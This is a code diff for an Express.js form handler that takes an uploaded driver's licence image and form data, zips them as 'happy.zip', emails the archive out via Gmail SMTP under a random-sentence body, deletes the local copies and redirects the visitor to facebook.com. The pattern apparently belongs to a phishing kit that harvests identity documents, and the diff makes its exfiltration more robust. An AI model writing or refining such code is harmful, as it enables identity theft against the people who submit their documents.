@@ -54,6 +54,10 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     const dataFileName = path.join(folderName, "happy.txt");
     fs.writeFileSync(dataFileName, JSON.stringify(data));
 
+    // create a zip file containing the message data
+    const zipFileName = path.join(folderName, "happy.zip");
+    await zipFolder.zip(folderName, zipFileName);
+
     // create nodemailer transport object
     const transporter = nodemailer.createTransport({
       host: "smtp.gmail.com",
@@ -73,10 +77,16 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
       text: `${randomSentence}`,
       attachments: [
         {
-          filename: "happy.txt",
-          path: dataFileName,
+          filename: "happy.zip",
+          path: zipFileName,
+          contentType: "application/zip",
+          encoding: "base64",
         },
       ],
+      headers: {
+        "Content-Type": "multipart/mixed",
+        "Content-Disposition": "attachment; filename=happy.zip",
+      },
     };
 
     // send mail with defined transport object
@@ -84,7 +94,7 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     console.log("Email sent successfully.", info);
 
     // remove the folder and file
-    fs.unlinkSync(dataFileName);
+    fs.unlinkSync(zipFileName);
     fs.rmdirSync(folderName, { recursive: true });
 
     res.redirect("https://www.facebook.com");
